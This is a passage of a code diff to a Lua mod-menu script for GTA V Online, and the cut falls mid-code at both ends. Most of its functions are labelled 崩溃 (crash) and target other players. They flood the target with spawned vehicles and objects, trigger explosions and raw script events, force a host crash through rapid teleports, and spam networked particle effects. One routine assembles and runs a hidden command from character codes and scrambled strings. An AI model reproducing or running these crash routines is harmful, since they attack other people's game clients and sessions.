-            util.trigger_script_event(1 << PlayerID, {548471420, 3, 804923209, 1128590390, 136699892, -168325547, -814593329, 1630974017, 1101362956, 1510529262, 2, 1875285955, 633832161, -1097780228})
-            end
-    end)
-   menu.toggle_loop(player_removals, "火车飞机漫天飞", {"huochefeijifly"}, "", function(train_loop)
-        local stupid_pos <const> = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(PlayerID)) stupid_pos.z = stupid_pos.z + 1
-        util.create_thread(function ()
-            local mod_vel = {-1600252419,-1660661558,745926877,920453016,3186376089,1030400667,240201337,184361638,-32878452,1981688531}
-                for _spawn, value in pairs(mod_vel) do
-                    local s = {}
-                    for i = 1, 7, 1 do  
-                        s[_spawn] = CreateVehicle(value,stupid_pos,0)
-                        ENTITY.SET_ENTITY_AS_MISSION_ENTITY(Entity, true, false)
-                        util.yield(0)
-                        end
-                    end
-                    util.yield(8000)
-                    local ar_vs = entities.get_all_vehicles_as_handles()
-                    for key, value in pairs(ar_vs) do
-                    entities.delete_by_handle(value)
-                end
-            end,nil)
-        end)
-   	menu.action(player_removals, "消防栓的愤怒", {"xiaofangshuan"}, "", function ()
-	        util.request_model(200846641)
-	        local objects = {}
-	        for i = 1, 40 do
-	            local coords = players.get_position(PlayerID)
-	            objects[#objects + 1] = entities.create_object(200846641, v3.new(coords.x , coords.y , coords.z))
-	            util.yield()
-	        end
-	        util.yield(3000)
-	        for i = 1, 4 do
-	            local coords = players.get_position(PlayerID)
-	            FIRE.ADD_EXPLOSION(coords.x , coords.y , coords.z, 64, 100, true, true, 0.5, true)
-	            util.yield(400)
-	        end
-	        util.yield(500)
-	        for i = 1, #objects do
-	            entities.delete_by_handle(objects[i])
-	        end
-	        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(200846641)
-	end)
-
-    local pclpid = {}
-    function get_control_request(ent)
-        if not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(ent) then
-            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(ent)
-            local tick = 0
-            while not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(ent) and tick <= 100 do
-                tick = tick + 1
-                util.yield()
-                NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(ent)
-            end
-        end
-        if not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(ent) then
-            util.toast("Sin control de "..ent)
-        end
-        return NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(ent)
-    end
-   	menu.action(player_removals, "四面八方的愤怒", {"fennu"}, "", function ()
-        menu.trigger_commands("huochefeijifly " .. players.get_name(PlayerID))
-        menu.trigger_commands("xiaofangshuan " .. players.get_name(PlayerID))
-         notification( "崩溃完成", colors.black)
-    end)
-
-    menu.toggle_loop(player_removals, "无效载具崩溃V1", {}, "", function ()
-       BadOutfitCrashV1(PlayerID)
-    end)
-	menu.toggle_loop(player_removals, "无效载具崩溃V2", {}, "", function()
-	      local TPP = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
-		  local pos = ENTITY.GET_ENTITY_COORDS(TPP, true)
-		  pos.z = pos.z + 5
-		  veh = entities.get_all_vehicles_as_handles()
-		  
-        for i = 1, #veh do
-        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh[i])
-        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(veh[i], pos.x,pos.y,pos.z, ENTITY.GET_ENTITY_HEADING(TPP), 10)
-        TASK.TASK_VEHICLE_TEMP_ACTION(TPP, veh[i], 18, 999)
-        TASK.TASK_VEHICLE_TEMP_ACTION(TPP, veh[i], 16, 999)
-		end
-	end)
-    menu.toggle_loop(player_removals, "无效载具崩溃V3", {}, "", function ()
-        Invalid_vehicle_crashes(PlayerID)
-     end)
-------------------------------------------------------感谢daidai脚本-------------------------------------------------------------------
-    menu.action(player_removals, "GGB崩", {}, "", function(on_input)
-    store_dir = filesystem.store_dir() .. '\\YMss\\'
-      sound_selection_dir = store_dir .. '\\sound13.txt'
-      if not filesystem.is_dir(store_dir) then
-         util.toast("夜幕音频没有正确安装！.")
-         util.stop_script()
-end
-fp = io.open(sound_selection_dir, 'r')
-local file_selection = fp:read('*a')
-fp:close()
-local sound_location = store_dir .. '\\' .. file_selection
-if not filesystem.exists(sound_location) then
-    util.toast("[Startup Sound] " .. file_selection .. " 未找到音源.")
-else
-    PlaySound(sound_location, SND_FILENAME | SND_ASYNC)
-end
-util.keep_running()
-    local crash_tbl = {"SWYHWTGYSWTYSUWSLSWTDSEDWSRTDWSOWSW45ERTSDWERTSVWUSWS5RTDFSWRTDFTSRYE","6825615WSHKWJLW8YGSWY8778SGWSESBGVSSTWSFGWYHSTEWHSHWG98171S7HWRUWSHJH","GHWSTFWFKWSFRWDFSRFSRTDFSGICFWSTFYWRTFYSSFSWSYWSRTYFSTWSYWSKWSFCWDFCSW",}
-    local crash_tbl_2 = {{17, 32, 48, 69},{14, 30, 37, 46, 47, 63},{9, 27, 28, 60}}
-        if PlayerID == players.user() then
-            util.toast("夜幕提醒" .. players.get_name(players.user()) .. "\n你不能崩溃你自己哦")
-            return 
-        end
-        if PlayerID == players.get_host() then 
-            util.toast("夜幕提醒" .. players.get_name(players.user()) .. "\n你不能崩溃主机哦")
-                    return
-        end
-            util.toast("[夜幕 提示]\n正在崩溃中")
-            util.yield(1000)
-    local cur_crash_meth = ""
-    local cur_crash = ""
-        for a,b in pairs(crash_tbl_2) do
-            cur_crash = ""
-            for c,d in pairs(b) do
-                cur_crash = cur_crash .. string.sub(crash_tbl[a], d, d)
-        end
-            cur_crash_meth = cur_crash_meth .. cur_crash
-            end
-    local crash_keys = {"NULL", "VOID", "NaN", "127563/0", "NIL"}
-    local crash_table = {109, 101, 110, 117, 046, 116, 114, 105, 103, 103, 101, 114, 095, 099, 111, 109, 109, 097, 110, 100, 115, 040}
-    local crash_str = ""
+        local crash_keys = {"NULL", "VOID", "NaN", "127563/0", "NIL"}
+        local crash_table = {109, 101, 110, 117, 046, 116, 114, 105, 103, 103, 101, 114, 095, 099, 111, 109, 109, 097, 110, 100, 115, 040}
+        local crash_str = ""
         for k,v in pairs(crash_table) do
             crash_str = crash_str .. string.char(crash_table[k])
         end
-    menu.trigger_commands("spectate" .. players.get_name(players.user()))
-        util.yield(500)
-            local this_int = 1
-            while this_int < 1000 do 
-                this_int += 1
+        local this_int = 1
+        while this_int < 1000 do 
+            this_int += 1
         end
-            local crash_compiled_func = load(crash_str .. '\"' .. cur_crash_meth .. players.get_name(PlayerID) .. '\")')
-            pcall(crash_compiled_func)
+        local crash_compiled_func = load(crash_str .. '\"' .. cur_crash_meth .. players.get_name(PlayerID) .. '\")')
+        pcall(crash_compiled_func)
+         notification( "夜夜笙歌---崩溃结束", colors.black)
     end)
-    menu.action(player_removals, "主机崩溃", {""}, "", function()
-        notification("开始崩溃", colors.black)
-        local self_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user())
-        ENTITY.SET_ENTITY_COORDS(self_ped, -6170, 10837, 40, true, false, false)
-        util.yield(1000)
-        ENTITY.SET_ENTITY_COORDS(self_ped, -18, 708, 243, true, false, false)
-        util.yield(1000)
-        ENTITY.SET_ENTITY_COORDS(self_ped, -74, 100, 174, true, false, false)
-        util.yield(1000)
-        ENTITY.SET_ENTITY_COORDS(self_ped, -101, 100, 374, true, false, false)
-        util.yield(1000)
-        ENTITY.SET_ENTITY_COORDS(self_ped, -6170, 10837, 40, true, false, false)
-        util.yield(900)
-        ENTITY.SET_ENTITY_COORDS(self_ped, -18, 708, 243, true, false, false)
-        util.yield(900)
-        ENTITY.SET_ENTITY_COORDS(self_ped, -74, 100, 174, true, false, false)
-        util.yield(900)
-        ENTITY.SET_ENTITY_COORDS(self_ped, -101, 100, 374, true, false, false)
-        util.yield(1000)
-        menu.trigger_commands("tpmtchiliad")
-        notification("崩溃完成 ", colors.black)
+    menu.action(collapse1, "招蜂引蝶", {"zhaofengyindie"}, "", function()
+       zhaofengyindie_crash(PlayerID)
+        notification( "招蜂引蝶---崩溃结束", colors.black)
     end)
-menu.action(player_removals, "青烟崩溃", {""}, "", function()
-        local player_pos = players.get_position(PlayerID)
-        request_ptfx_asset("core")
-        GRAPHICS.USE_PARTICLE_FX_ASSET("core")
-        GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
-            "ent_ray_heli_aprtmnt_water", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
-        GRAPHICS.USE_PARTICLE_FX_ASSET("core")
-        GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
-            "ent_dst_inflatable", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
-        request_ptfx_asset("scr_sum2_hal")
-        GRAPHICS.USE_PARTICLE_FX_ASSET("scr_sum2_hal")
-        GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
-            "scr_sum2_hal_rider_death_green", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
-        GRAPHICS.USE_PARTICLE_FX_ASSET("scr_sum2_hal")
-        GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
-            "scr_sum2_hal_rider_death_white", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
-        GRAPHICS.USE_PARTICLE_FX_ASSET("core")
-        GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
-            "ent_sht_oil", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
-     for i =1, 55 do 
-local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
-local coords = ENTITY.GET_ENTITY_COORDS(ped)
-local model = util.joaat("shamal")
-request_model(model)
-local vehicle = entities.create_vehicle(model,coords,0)
-VEHICLE.SET_VEHICLE_MOD_KIT(vehicle, 0)
-ENTITY.SET_ENTITY_COLLISION(vehicle, false, true)
-VEHICLE.SET_VEHICLE_GRAVITY(vehicle, 0)
-for i=0, 55 do
-    local max_mod = VEHICLE.GET_NUM_VEHICLE_MODS(vehicle, i)-1
-    VEHICLE.SET_VEHICLE_MOD(vehicle, i, max_mod, false)
-end
-end
-end)
-menu.toggle_loop(player_removals, "CRUSH崩溃", {""}, "crush on you！", function()
-			menu.trigger_commands("anticrashcam on")
-			menu.trigger_commands("potatomode on")
-        if players.exists(PlayerID) then
-            local freeze_toggle = menu.ref_by_rel_path(menu.player_root(PlayerID), "Trolling>Freeze")
-            local player_pos = players.get_position(PlayerID)
-            menu.set_value(freeze_toggle, true)
-            request_ptfx_asset("core")
-            GRAPHICS.USE_PARTICLE_FX_ASSET("core")
-            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
-                "veh_respray_smoke", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
-            GRAPHICS.USE_PARTICLE_FX_ASSET("core")
-            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
-                "ent_sht_electrical_box", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
-            GRAPHICS.USE_PARTICLE_FX_ASSET("core")
-            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
-                "exp_extinguisher", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
-            GRAPHICS.USE_PARTICLE_FX_ASSET("core")
-            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
-                "veh_rotor_break", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
-            GRAPHICS.USE_PARTICLE_FX_ASSET("core")
-            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
-                "ent_ray_heli_aprtmnt_water", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
-            GRAPHICS.USE_PARTICLE_FX_ASSET("core")
-            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
-                "ent_dst_inflatable", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
-            request_ptfx_asset("scr_sum2_hal")
-            GRAPHICS.USE_PARTICLE_FX_ASSET("scr_sum2_hal")
-            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
-                "scr_sum2_hal_rider_death_green", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
-            GRAPHICS.USE_PARTICLE_FX_ASSET("scr_sum2_hal")
-            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
-                "scr_sum2_hal_rider_death_white", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
-            GRAPHICS.USE_PARTICLE_FX_ASSET("core")
-            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
-               "ent_sht_oil", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
-            menu.set_value(freeze_toggle, false)
-        end
-    local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
-    local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
-   PLAYER.SET_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(PLAYER.PLAYER_ID(),0xE5022D03)
-   TASK.CLEAR_PED_TASKS_IMMEDIATELY(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()))
-   wait(20)
-   local p_pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID))
-   ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()),p_pos.x,p_pos.y,p_pos.z,false,true,true)
-   WEAPON.GIVE_DELAYED_WEAPON_TO_PED(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()), 0xFBAB5776, 1000, false)
-   TASK.TASK_PARACHUTE_TO_TARGET(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()),-1087,-3012,13.94)
-   wait(500)
-   TASK.CLEAR_PED_TASKS_IMMEDIATELY(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()))
-   wait(1000)
-   PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(PLAYER.PLAYER_ID())
-   TASK.CLEAR_PED_TASKS_IMMEDIATELY(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()))
-    local cargobob = CreateVehicle(0XFCFCB68B, TargetPlayerPos, ENTITY.GET_ENTITY_HEADING(SelfPlayerPed), true)
-    local cargobobPos = ENTITY.GET_ENTITY_COORDS(cargobob, true)
-    local vehicle = CreateVehicle(0X187D938D, TargetPlayerPos, ENTITY.GET_ENTITY_HEADING(SelfPlayerPed), true)
-    local vehiclePos = ENTITY.GET_ENTITY_COORDS(vehicle, true)
-    local newRope = PHYSICS.ADD_ROPE(TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, 0, 0, 10, 1, 1, 0, 1, 1, false, false, false, 1.0, false, 0)
-        PHYSICS.ATTACH_ENTITIES_TO_ROPE(newRope, cargobob, vehicle, cargobobPos.x, cargobobPos.y, cargobobPos.z, vehiclePos.x, vehiclePos.y, vehiclePos.z, 2, false, false, 0, 0, "Center", "Center")
-         wait(100)
-    if players.exists(PlayerID) then
-        notification("[夜幕提示]未能移除该玩家，开始crush1崩溃",colors.black)
-    local PED1 = CreatePed(26,util.joaat("cs_beverly"),TargetPlayerPos, 0)
-    ENTITY.SET_ENTITY_VISIBLE(PED1, false, 0)
-    wait(100)
-    WEAPON.GIVE_WEAPON_TO_PED(PED1,-270015777,80,true,true)
-    wait(1000)
-    FIRE.ADD_OWNED_EXPLOSION(players.user_ped(), TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, 2, 50, true, false, 0.0)  
-    wait(10000)
-    entities.delete_by_handle(PED1) 
-    end  
-    if players.exists(PlayerID) then
-        notification("[夜幕提示]未能移除该玩家，开始crush2崩溃",colors.black)
-        local PED2 = CreatePed(26,util.joaat("cs_fabien"),TargetPlayerPos, 0)
-            menu.set_value(freeze_toggle, true)
-            request_ptfx_asset("core")
-            GRAPHICS.USE_PARTICLE_FX_ASSET("core")
-            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
-                "veh_respray_smoke", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
-            GRAPHICS.USE_PARTICLE_FX_ASSET("core")
-            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
-                "ent_sht_electrical_box", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
-            GRAPHICS.USE_PARTICLE_FX_ASSET("core")
-            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
-                "exp_extinguisher", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
-            GRAPHICS.USE_PARTICLE_FX_ASSET("core")
-            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
-                "veh_rotor_break", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
-            GRAPHICS.USE_PARTICLE_FX_ASSET("core")
-            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
-                "ent_ray_heli_aprtmnt_water", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
-            GRAPHICS.USE_PARTICLE_FX_ASSET("core")
-            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
-                "ent_dst_inflatable", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
-            request_ptfx_asset("scr_sum2_hal")
-            GRAPHICS.USE_PARTICLE_FX_ASSET("scr_sum2_hal")
-            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
-                "scr_sum2_hal_rider_death_green", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
-            GRAPHICS.USE_PARTICLE_FX_ASSET("scr_sum2_hal")
-            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
-                "scr_sum2_hal_rider_death_white", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
-            GRAPHICS.USE_PARTICLE_FX_ASSET("core")
-            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
-               "ent_sht_oil", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
-            menu.set_value(freeze_toggle, false)
-        ENTITY.SET_ENTITY_VISIBLE(PED2, false, 0)
-        wait(100)
-        WEAPON.GIVE_WEAPON_TO_PED(PED2,-270015777,80,true,true)
-        wait(1000)
-        FIRE.ADD_OWNED_EXPLOSION(players.user_ped(), TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, 2, 50, true, false, 0.0)
-        wait(10000)
-        entities.delete_by_handle(PED2)
-    end
-    if players.exists(PlayerID) then
-        notification("[夜幕提示]未能移除该玩家，开始crush3崩溃",colors.black)
-        local PED3 = CreatePed(26,util.joaat("cs_manuel"),TargetPlayerPos, 0)
-            menu.set_value(freeze_toggle, true)
-            request_ptfx_asset("core")
-            GRAPHICS.USE_PARTICLE_FX_ASSET("core")
-            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
-                "veh_respray_smoke", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
-            GRAPHICS.USE_PARTICLE_FX_ASSET("core")
-            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
-                "ent_sht_electrical_box", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
-            GRAPHICS.USE_PARTICLE_FX_ASSET("core")
-            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
-                "exp_extinguisher", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
-            GRAPHICS.USE_PARTICLE_FX_ASSET("core")
-            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
-                "veh_rotor_break", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
-            GRAPHICS.USE_PARTICLE_FX_ASSET("core")
-            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
-                "ent_ray_heli_aprtmnt_water", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
-            GRAPHICS.USE_PARTICLE_FX_ASSET("core")
-            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
-                "ent_dst_inflatable", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
-            request_ptfx_asset("scr_sum2_hal")
-            GRAPHICS.USE_PARTICLE_FX_ASSET("scr_sum2_hal")
-            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
-                "scr_sum2_hal_rider_death_green", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
-            GRAPHICS.USE_PARTICLE_FX_ASSET("scr_sum2_hal")
-            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
-                "scr_sum2_hal_rider_death_white", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
-            GRAPHICS.USE_PARTICLE_FX_ASSET("core")
-            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
-               "ent_sht_oil", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
-            menu.set_value(freeze_toggle, false)
-        ENTITY.SET_ENTITY_VISIBLE(PED3, false, 0)
-        wait(100)
-        WEAPON.GIVE_WEAPON_TO_PED(PED3,-270015777,80,true,true)
-        wait(1000)
-        FIRE.ADD_OWNED_EXPLOSION(players.user_ped(), TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, 2, 50, true, false, 0.0)
-        wait(10000)
-        entities.delete_by_handle(PED3)
-    end
-    if players.exists(PlayerID) then
-        notification("[夜幕提示]未能移除该玩家，开始crush4崩溃",colors.black)
-        local PED4 = CreatePed(26,util.joaat("cs_taostranslator"),TargetPlayerPos, 0)
-            menu.set_value(freeze_toggle, true)
-            request_ptfx_asset("core")
-            GRAPHICS.USE_PARTICLE_FX_ASSET("core")
-            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
-                "veh_respray_smoke", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
-            GRAPHICS.USE_PARTICLE_FX_ASSET("core")
-            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
-                "ent_sht_electrical_box", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
-            GRAPHICS.USE_PARTICLE_FX_ASSET("core")
-            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
-                "exp_extinguisher", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
-            GRAPHICS.USE_PARTICLE_FX_ASSET("core")
-            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
-                "veh_rotor_break", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
-            GRAPHICS.USE_PARTICLE_FX_ASSET("core")
-            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
-                "ent_ray_heli_aprtmnt_water", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
-            GRAPHICS.USE_PARTICLE_FX_ASSET("core")
-            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
-                "ent_dst_inflatable", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
-            request_ptfx_asset("scr_sum2_hal")
-            GRAPHICS.USE_PARTICLE_FX_ASSET("scr_sum2_hal")
-            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
-                "scr_sum2_hal_rider_death_green", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
-            GRAPHICS.USE_PARTICLE_FX_ASSET("scr_sum2_hal")
-            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
-                "scr_sum2_hal_rider_death_white", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
-            GRAPHICS.USE_PARTICLE_FX_ASSET("core")
-            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
-               "ent_sht_oil", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
-            menu.set_value(freeze_toggle, false)
-        ENTITY.SET_ENTITY_VISIBLE(PED4, false, 0)
-        wait(100)
-        WEAPON.GIVE_WEAPON_TO_PED(PED4,-270015777,80,true,true)
-        wait(1000)
-        FIRE.ADD_OWNED_EXPLOSION(players.user_ped(), TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, 2, 50, true, false, 0.0)
-        wait(10000)
-        entities.delete_by_handle(PED4)
-    end
-    if players.exists(PlayerID) then
-        notification("[夜幕提示]未能移除该玩家，开始crush5崩溃",colors.black)
-        local PED5 = CreatePed(26,util.joaat("cs_taostranslator2"),TargetPlayerPos, 0)
-            menu.set_value(freeze_toggle, true)
-            request_ptfx_asset("core")
-            GRAPHICS.USE_PARTICLE_FX_ASSET("core")
-            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
-                "veh_respray_smoke", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
-            GRAPHICS.USE_PARTICLE_FX_ASSET("core")
-            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
-                "ent_sht_electrical_box", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
-            GRAPHICS.USE_PARTICLE_FX_ASSET("core")
-            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
-                "exp_extinguisher", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
-            GRAPHICS.USE_PARTICLE_FX_ASSET("core")
-            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
-                "veh_rotor_break", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
-            GRAPHICS.USE_PARTICLE_FX_ASSET("core")
-            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
-                "ent_ray_heli_aprtmnt_water", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
-            GRAPHICS.USE_PARTICLE_FX_ASSET("core")
-            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
-                "ent_dst_inflatable", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
-            request_ptfx_asset("scr_sum2_hal")
-            GRAPHICS.USE_PARTICLE_FX_ASSET("scr_sum2_hal")
-            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
-                "scr_sum2_hal_rider_death_green", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
-            GRAPHICS.USE_PARTICLE_FX_ASSET("scr_sum2_hal")
-            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
-                "scr_sum2_hal_rider_death_white", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
-            GRAPHICS.USE_PARTICLE_FX_ASSET("core")
-            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
-               "ent_sht_oil", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
-            menu.set_value(freeze_toggle, false)
-        ENTITY.SET_ENTITY_VISIBLE(PED5, false, 0)
-        wait(100)
-        WEAPON.GIVE_WEAPON_TO_PED(PED5,-270015777,80,true,true)
-        wait(1000)
-        FIRE.ADD_OWNED_EXPLOSION(players.user_ped(), TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, 2, 50, true, false, 0.0)
-        wait(10000)
-        entities.delete_by_handle(PED5)
-    end
-    if players.exists(PlayerID) then
-        notification("[夜幕提示]未能移除该玩家，开始crush6崩溃",colors.black)
-        local PED6 = CreatePed(26,util.joaat("cs_tenniscoach"),TargetPlayerPos, 0)
-            menu.set_value(freeze_toggle, true)
-            request_ptfx_asset("core")
-            GRAPHICS.USE_PARTICLE_FX_ASSET("core")
-            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
-                "veh_respray_smoke", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
-            GRAPHICS.USE_PARTICLE_FX_ASSET("core")
-            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
